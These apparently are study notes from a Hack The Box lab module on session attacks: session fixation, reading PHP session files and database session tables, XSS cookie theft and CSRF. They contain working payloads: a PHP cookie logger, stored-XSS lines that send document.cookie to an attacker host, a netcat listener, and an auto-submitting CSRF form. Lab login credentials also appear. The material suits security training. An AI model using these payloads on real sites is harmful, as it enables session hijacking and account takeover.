# Introduction to Sessions

A user session is a series of requests from the same client and the server responses during a specific time. Web applications use sessions to track user data, access rights, localization, and status, both before and after login.

HTTP is stateless, meaning each request is independent. Therefore, web apps use cookies, URL parameters, POST data, or other methods to maintain session state.

## Module Targets & Lab Setup

Lab uses virtual hosts (vhosts) like:

`xss.htb.net, csrf.htb.net, oredirect.htb.net, minilab.htb.net`

Map them in /etc/hosts on your attack VM:

`IP=<TARGET_IP>`
`printf "%s\t%s\n\n" "$IP" "xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net" | sudo tee -a /etc/hosts`

Check /etc/hosts to confirm the entries. You can edit manually or via a script.

Always update hosts if you spawn a new target VM.

# Session Fixation

Session Fixation happens when an attacker sets a valid session ID for a victim. If the victim logs in with this session ID, the attacker can hijack their session.

## How it works (3 stages):

- Obtain a valid session ID – Applications often assign valid IDs to anyone browsing or registering.
- Fixate the session ID – If the app accepts session IDs from URL parameters or POST data, the attacker can set it.
- Trick the victim – Send the victim a URL containing the fixed session ID. When they log in, the attacker can hijack the session.

# Obtaining Session Identifiers Without User Interaction

## 1. Traffic Sniffing

Attackers on the same local network can capture unencrypted HTTP traffic to get session identifiers. Encrypted traffic (HTTPS, IPsec) prevents this.

Requirements:

- Attacker on the same local network
- Unencrypted HTTP traffic
- Tools: Wireshark

## 2. Post-Exploitation (Web Server Access)

**PHP:**

Session files stored in session.save_path (from php.ini)

<pre>$ locate php.ini
$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
$ ls /var/lib/php/sessions
$ cat /var/lib/php/sessions/sess_<sessionID> </pre>

**Cookie to hijack:**

cookie name: `PHPSESSID`
cookie value: `<sessionID>`

**Java (Tomcat):**

Session manager stores sessions in `SESSIONS.ser`

**.NET:**

Session data in:

`aspnet_wp.exe` (InProc)

`StateServer` (OutProc)

## SQL Server

**3. Post-Exploitation (Database Access)**

If you have database access (via SQL injection or credentials), check for session tables:

<pre>show databases;
use project;
show tables;
select * from users;
select * from all_sessions;
select * from all_sessions where id=3;</pre>

Extracted session IDs allow logging in as users without credentials.


# Cross-Site Scripting (XSS) for Session Hijacking

XSS allows attackers to run arbitrary JavaScript in a victim’s browser. Here, we focus on stealing session cookies using XSS.

Requirements for cookie theft via XSS:

- Session cookies sent in HTTP requests
- Cookies must be accessible via JavaScript (HTTPOnly should be missing)


**Payloads for testing:**

<pre>"><img src=x onerror=prompt(document.domain)>
"><img src=x onerror=confirm(1)>
"><img src=x onerror=alert(1)></pre>

Save changes

Check “Share” functionality for stored XSS execution

## Cookie-Stealing Script (PHP)

Save as log.php on your server:

<pre><?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?></pre>

Run PHP server:

`php -S <VPN/TUN Adapter IP>:8000`

## Stored XSS Payload for Cookie Theft

Update the Country field with:

`<style>@keyframes x{}</style>`
`<video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>`

Alternative HTTPS-safe payload:

`<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>`

## Simulate Victim

Open New Private Window

Login with victim account:

Email: smallfrog576
Password: guitars

Visit the attacker-controlled profile URL:

`http://xss.htb.net/profile?email=ela.stienen@example.com`

PHP server will capture the victim’s cookie in `cookieLog.txt`

## Netcat Option

Instead of PHP, you can use Netcat:

Payload in Country field:

`<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>`

Start Netcat listener:

`nc -nlvp 8000`

When the victim triggers the payload, Netcat receives the cookie (Base64 encoded)

**Decode with JavaScript:**

`atob("<base64_string>")`

## Stealthier Option

Use `fetch()` to send cookies without redirecting the victim:

`<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>`

Sends cookie to your server silently


# Cross-Site Request Forgery (CSRF/XSRF)

CSRF forces a logged-in user to perform unwanted actions on a web application without their knowledge. Attackers leverage a victim’s authenticated session to execute requests.

Vulnerable applications:

- All request parameters can be guessed or determined
- Session management relies solely on cookies

Requirements to exploit CSRF:

- Craft a malicious page that issues a valid request as the victim
- Victim must be logged in when the request is issued

## Lab Setup

Spawn the target system and configure vhost xss.htb.net.

Login to attacker account:

Email: crazygorilla983
Password: pisces

Run Burp Suite and activate the proxy (Intercept On). Configure your browser to go through it.

Click “Save” on your profile to inspect the request. You should see a POST request to /api/update-profile with parameters email, telephone, country and no anti-CSRF token.

## CSRF Attack Example

We can change a user’s profile by having them visit a malicious HTML page.

Malicious page (notmalicious.html):

<pre><html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html></pre>

Serve the page on your machine:

`python -m http.server 1337`

## Simulate Victim

While logged in as Ela Stienen:

Email: ela.stienen@example.com

Visit the malicious page:

`http://<VPN/TUN Adapter IP>:1337/notmalicious.html`

Ela Stienen’s profile fields (email, telephone, country) will change to the values in the HTML page

Confirms the application lacks CSRF protection

